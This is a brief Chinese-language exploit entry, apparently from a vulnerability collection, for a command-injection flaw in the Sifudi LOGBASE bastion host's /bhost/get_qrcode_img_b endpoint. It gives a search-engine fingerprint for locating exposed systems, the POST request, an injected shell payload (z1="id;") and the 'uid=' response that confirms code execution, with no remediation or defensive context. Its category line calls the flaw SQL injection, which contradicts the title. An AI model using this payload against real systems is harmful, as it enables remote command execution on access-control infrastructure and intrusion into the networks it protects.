# 思迪福堡垒机系统get_qrcode_img_b存在命令注入漏洞

思迪福堡垒机系统 ｜ SQL注入 ｜ —
- **指纹**：`app="思福迪-LOGBASE"`
- **请求**：`POST /bhost/get_qrcode_img_b HTTP/1.1`

**Payload**
```
z1="id;"
```
- **响应特征**：200 uid=